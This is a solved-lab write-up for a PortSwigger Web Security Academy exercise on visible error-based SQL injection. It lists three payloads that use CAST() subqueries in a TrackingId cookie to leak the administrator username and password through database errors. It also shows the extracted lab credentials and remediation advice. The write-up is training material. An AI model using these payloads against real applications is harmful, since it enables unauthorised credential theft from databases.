# Visible Error-Based SQL Injection

* **Platform:** PortSwigger Web Security Academy
* **Difficulty:** Practitioner
* **Category:** SQL Injection — Error-Based SQL Injection
* **Status:** Solved
* **Tool:** Burp Suite

## Objective

Exploit SQL injection in the `TrackingId` cookie to retrieve sensitive information from the database by triggering errors that expose query results.

## Methodology

1. Intercepted the application request using Burp Suite and identified the `TrackingId` cookie as the injection point.
2. Tested quotation marks to identify SQL syntax errors.
3. Used the `CAST()` function to convert SQL query results into integers.
4. Confirmed SQL injection by triggering a database type-conversion error.
5. Retrieved the administrator username by injecting a subquery into the `CAST()` function.
6. Retrieved the administrator password by exploiting error messages that exposed the actual database value.
7. Successfully extracted the credentials and completed the lab.

## Payloads

**Confirm SQL injection using CAST():**

```sql
' AND 1=CAST((SELECT 1) AS int)--
```

**Retrieve the administrator username:**

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

**Retrieve the administrator password:**

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

## Extracted Information

**Username:**

```text
administrator
```

**Password:**

```text
e4i5s9n8j7zimwtlp2ov
```

## Vulnerability

The application incorporated untrusted cookie values into SQL queries without adequate protection. Additionally, database error messages exposed sensitive information from the database.

## Impact

An attacker could exploit SQL injection and retrieve sensitive database information, including usernames and passwords, through error messages.

## Remediation

* Use parameterized queries (prepared statements).
* Avoid concatenating untrusted input into SQL statements.
* Disable detailed database error messages in production.
* Return generic error messages to users.
* Apply least-privilege database permissions.

## Evidence
<img width="1830" height="680" alt="Screenshot 2026-11-01 003127" src="https://github.com/user-attachments/assets/00a93815-c5c5-41a5-b742-52c5ef2a02df" />

<img width="1830" height="680" alt="image" src="https://github.com/user-attachments/assets/866ca492-dcc8-44da-b3a2-c9d779a7f47c" />

<img width="1500" height="747" alt="image" src="https://github.com/user-attachments/assets/a1425d18-15f0-4e4c-806c-6b0224c859d3" />



